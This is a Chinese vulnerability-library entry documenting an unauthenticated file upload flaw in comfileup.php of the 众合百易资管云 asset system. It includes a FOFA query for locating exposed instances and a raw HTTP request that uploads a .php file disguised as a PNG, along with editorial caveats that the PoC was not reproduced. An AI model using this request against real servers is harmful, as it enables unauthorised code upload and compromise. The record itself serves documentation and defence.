---
source: "wy876 漏洞文库"
title: "众合百易资管云 comfileup.php前台上传"
product: "众合百易资管云"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；PHP解析与目录可访问配置"
prerequisites: "有ASP.NET会话Cookie，必要性未知"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/hkdpgnqni0idpkxy"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BC%97%E5%90%88%E7%99%BE%E6%98%93/%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9Fcomfileup%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"media/css/uniform.default.css\" && body=\"资管云\""
fofa_unverified: "body="
id: "vw-3d6a37eaea1ad777587ae99e"
entity_id: "ve-3d6a37eaea1ad777587ae99e"
schema_version: "1"
---

# 众合百易资管云 comfileup.php前台上传

## 条目说明

- 对象与具体问题：众合百易资管云；comfileup.php前台上传
- 版本、配置及部署条件：版本未知；PHP解析与目录可访问配置
- 认证与权限前提：有ASP.NET会话Cookie，必要性未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Content-Length35827与仅123小文件的短multipart严重不符，疑复制未更新
- 上传内容123不能证明PHP执行；日期化随机文件路径需取返回而非固定复用
- 缺响应/修复/版本，产品介绍占比过大

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
湖南众合百易信息技术有限公司（简称：百易云）成立于2017年是一家专注于不动产领域数字化研发及服务的国家高新技术企业，公司拥有不动产领域的数字化全面解决方案、覆盖住宅、写字楼、商业中心、专业市场、产业园区、公建、后勤等多种业态、通过数字化帮助企业实现数字化转型，有效提高公司管理水平及业务办理效率、降低运营成本，公司自成立以来，已帮助众多企业实现数字化转型。资产管理运营系统comfileup前台文件上传漏洞

## 二、影响版本
+ 资产管理运营系统

## 三、资产测绘
+ fofa`body="media/css/uniform.default.css" && body="资管云"`
+ 特征


## 四、漏洞复现
```http
POST /comfileup.php HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: ASP.NET_SessionId=vkp4usonpxcstreczz05g113
Accept: */*
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest

-----------------------------289666258334735365651210512949
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/png

123
-----------------------------289666258334735365651210512949--
```

> 请求长度说明：原资料 Content-Length 为 35827；静态长度已移除，应由客户端根据最终请求体的字节数生成。


```plain
/uploads/202407/0725/20240725-66a1f85ecfb2c.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hkdpgnqni0idpkxy>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
